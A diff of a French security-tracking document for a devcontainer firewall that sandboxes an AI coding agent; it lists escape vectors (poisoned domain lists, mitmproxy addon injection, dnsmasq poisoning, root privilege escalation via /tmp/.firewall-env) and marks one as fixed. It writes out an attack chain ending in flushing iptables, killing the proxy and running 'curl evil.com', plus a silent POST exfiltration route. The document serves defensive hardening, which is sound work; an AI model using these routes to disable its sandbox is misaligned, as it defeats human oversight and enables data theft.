@@ -97,7 +97,7 @@ grep -F test /etc/devcontainer-firewall/.poc            → no match (découplé
 | 1 | `domains.local.txt` + `policy.local.d/` poison | (2) (3) | 🟢 | 1 ✅ |
 | 2 | Injection Python dans `addons/*.py` (5 fichiers) | (2) (3) | 🟢 | 1 ✅ |
 | 3 | `dnsmasq.conf` poison (`address=`/`ipset=`) | (2) (3) | 🟢 | 1 ✅ |
-| 4 | `/tmp/.firewall-env` source-as-root (privesc → tout) | (2) (3) via root | 🔴 | 2 |
+| 4 | `/tmp/.firewall-env` source-as-root (privesc → tout) | (2) (3) via root | 🟢 | 2 ✅ |
 | 5 | Hooks Claude `Stop`/`SessionEnd` (`settings.json`) | aucun (node-level) | ⚪ | 3 (optional) |
 | 6 | Scripts lifecycle bind-montés (`shell-init.sh` & co) | aucun (node-level) | ⚪ | accepted |
 | 7 | `vscode-settings.json` tasks/env auto-run | aucun (node-level) | ⚪ | accepted |
@@ -114,7 +114,10 @@ grep -F test /etc/devcontainer-firewall/.poc            → no match (découplé
 `/tmp/.firewall-env` → `sudo init-firewall.sh` → code root →
 `iptables -F` + `pkill mitmdump` → `curl evil.com` direct.
 
-→ Bloqué par session 2.
+→ Bloqué par session 2 ✅ (la ligne `source /tmp/.firewall-env` est
+supprimée d'init-firewall.sh et test-firewall.sh ; le fichier n'est
+plus écrit par post-start.sh ni on-create.sh ; debug toggle passé
+via `--debug` CLI flag).
 
 **Reload furtif (avant fix)** : #8 (élargir `policy.d/api.anthropic.com.yaml`)
 + #2 (un seul addon Python modifié pour POST silencieux via path-tunnel
